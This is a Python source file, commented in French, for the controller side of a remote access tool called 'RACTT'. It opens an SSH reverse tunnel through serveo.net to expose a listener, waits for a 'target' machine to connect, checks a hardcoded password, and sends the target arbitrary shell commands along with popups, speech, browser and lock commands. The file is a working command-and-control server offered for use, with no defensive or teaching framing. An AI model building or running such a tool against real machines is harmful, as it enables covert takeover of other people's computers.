import socket
import subprocess
import time
import os
import platform

# --- CONFIGURATION ---
PORT_LOCAL = 4444
PASSWORD = "1234"
ID_URL = "103fa379dfd22edd-93-23-16-243" # Votre ID Serveo

HELP_MENU = """
╔══════════════════════════════════════════════════════╗
║                COMMANDES DE CONTRÔLE                 ║
╠══════════════════════════════════════════════════════╣
║  help             → Affiche ce menu                  ║
║  popup:Message    → Alerte sur l'écran cible         ║
║  speak:Texte      → Synthèse vocale (espeak)         ║
║  browser:URL      → Ouvre un site web                ║
║  lock             → Verrouille la session            ║
║  battery          → État de la batterie              ║
║  exit             → Fermer la connexion              ║
║  [commande]       → Commande shell (ex: ls, pwd)     ║
╚══════════════════════════════════════════════════════╝
"""

def lancer_tunnel():
    print(f"[*] Initialisation du tunnel mondial : {ID_URL}.serveousercontent.com")
    cmd = ["ssh", "-o", "StrictHostKeyChecking=no", "-R", f"{ID_URL}:80:localhost:{PORT_LOCAL}", "serveo.net"]
    return subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def start_server():
    tunnel = lancer_tunnel()
    time.sleep(5) # Attente de l'établissement du tunnel

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', PORT_LOCAL))
        s.listen(1)
        print(f"[*] Serveur prêt. En attente de la cible...")

        while True:
            try:
                conn, addr = s.accept()
                # Réception des infos d'identification du client
                infos_client = conn.recv(1024).decode()
                print(f"\n[+] CONNEXION REÇUE\n{infos_client}")
                
                conn.sendall(b"AUTH_REQUIRED")
                if conn.recv(1024).decode() == PASSWORD:
                    conn.sendall(b"AUTH_SUCCESS")
                    print("[*] Accès validé. Tapez 'help' pour les commandes.")
                    
                    while True:
                        cmd = input("RACTT > ").strip()
                        if not cmd: continue
                        if cmd.lower() == "help":
                            print(HELP_MENU)
                            continue
                        
                        conn.sendall(cmd.encode())
                        if cmd.lower() == "exit": break
                        
                        reponse = conn.recv(10240).decode()
                        print(f"\n{reponse}")
                else:
                    conn.sendall(b"AUTH_FAILED")
                conn.close()
            except KeyboardInterrupt:
                print("\n[*] Arrêt du serveur...")
                tunnel.terminate()
                break

if __name__ == "__main__":
    start_server()
